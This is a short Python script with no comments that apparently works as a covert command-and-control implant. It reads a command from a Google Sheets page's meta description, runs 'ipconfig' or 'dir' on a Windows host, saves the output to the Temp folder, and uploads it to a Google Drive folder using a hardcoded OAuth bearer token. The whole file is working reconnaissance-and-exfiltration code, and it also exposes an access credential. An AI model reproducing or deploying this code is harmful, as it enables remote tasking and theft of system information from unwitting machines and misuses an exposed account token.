import json
import subprocess
import urllib.request
import requests
from bs4 import BeautifulSoup as soupy

html = urllib.request.urlopen('https://docs.google.com/spreadsheets/d/1ZyRdzSmeQwyEXlH-yy2jcT2AjrhtDQoYeIlbGEWTZW0').read()
soup = soupy(html, features="html.parser")
x = soup.find("meta", {"property": "og:description"})['content'].split(">")
final = x[1]
print(final)
if "ipconfig" in final:
    infomation = subprocess.check_output("ipconfig" ).decode('utf-8')
    f = open("C:\\Windows\\Temp\\network-infomation.txt", "w")
    f.write(infomation)
    f.close()
    headers = {
        "Authorization": "Bearer ya29.a0AfH6SMDciUM2KwVmMWCDrncW1mvIjZJCOBvsPamGFx3tCXHQnd62U8ogMKzPplypc6Iadc5jRPETDaYuIUoNg4oTK129hncu_R4xtQd4vrSuiLrRmLTZdT5oH7t-fqJRxLDldqwoZQct8SIKcgnYccIPDJWz"}
    para = {
        "name": "network-infomation.txt",
        "parents": ["1Rw-YgssmSMiJ3feyb13uDmylnlkVG_qF"]
    }
    files = {
        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
        'file': open("C:/Windows/Temp/network-infomation.txt", "rb")
    }
    r = requests.post(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        headers=headers,
        files=files
    )
elif "dir" in final:
    file = subprocess.check_output(["dir"], shell=True).decode('utf-8')
    t = open("C:\\Windows\\Temp\\file-infomation.txt", "w")
    t.write(file)
    t.close()
    headers = {
        "Authorization": "Bearer ya29.a0AfH6SMDciUM2KwVmMWCDrncW1mvIjZJCOBvsPamGFx3tCXHQnd62U8ogMKzPplypc6Iadc5jRPETDaYuIUoNg4oTK129hncu_R4xtQd4vrSuiLrRmLTZdT5oH7t-fqJRxLDldqwoZQct8SIKcgnYccIPDJWz"}
    para = {
        "name": "file-infomation.txt",
        "parents": ["1Rw-YgssmSMiJ3feyb13uDmylnlkVG_qF"]
    }
    files = {
        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
        'file': open("C:/Windows/Temp/file-infomation.txt", "rb")
    }
    r = requests.post(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        headers=headers,
        files=files
    )

else:
    print("error")
